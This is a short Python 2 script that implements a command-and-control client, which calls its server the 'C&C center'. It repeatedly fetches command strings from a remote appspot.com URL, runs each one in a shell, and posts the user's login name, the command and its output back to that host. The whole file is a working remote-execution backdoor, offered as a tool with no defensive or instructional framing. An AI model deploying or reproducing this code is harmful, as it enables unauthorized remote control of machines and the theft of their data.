#!/usr/bin/env python
#coding: utf-8
#Last-update: 2013-10-01 09:16:36

__author__ = '0xnz'
__version__ = '0.1'

import urllib
import urllib2
import socket
import cookielib
import commands
import os
import string
import time

class Server(object):
    def __init__(self):
        super(Server, self).__init__()
        self.__id = os.getlogin()
        self.__url = 'https://oxnzbot.appspot.com/_ah/xmpp/__0x01379/'
    def pull(self):
        succ = False
        while not succ:
            print 'pulling command from C&C center'
            try:
                #req = urllib2.Request('{0}?from={1}'.format(self.__url, 'a@b.com'))
                req = urllib2.Request('{0}?from={1}'.format(self.__url, self.__id))
                resp = urllib2.urlopen(req)
                succ = True
                return resp.read()
            except urllib2.URLError as e:
                print e
            except Exception as e:
                print e
        pass
    def exec_(self, cmd):
        print 'executing command: {0}'.format(cmd)
        status, output = commands.getstatusoutput(cmd)
        print 'status={0}, output={1}'.format(status, output)
        return (status, output)
        pass
    def push(self, data):
        succ = False
        while not succ:
            print 'pushing result to C&C center'
            try:
                req = urllib2.Request(self.__url, data)
                resp = urllib2.urlopen(req)
                print resp.info()
                succ = True
            except urllib2.URLError as e:
                print e
            except Exception as e:
                print e
        pass
    def loop(self):
        t = 1
        while True:
            try:
                cmd = self.pull()
                if cmd:
                    t = 1
                    (ret, out) = self.exec_(cmd)
                    self.push(urllib.urlencode({
                        'from': self.__id,
                        'command': cmd,
                        'status': ret,
                        'output': out,
                    }))
                else:
                    t = t*2
                    if t > 60*60:
                        t = 60
                    print '.' * t
                    time.sleep(t)
                    pass
            except KeyboardInterrupt:
                print 'CTRL-C: quiting...'
                return
            except urllib2.URLError as e:
                print 'URLError: {0}'.format(e)

def main():
    server = Server()
    server.loop()
    pass

if __name__ == '__main__':
    main()
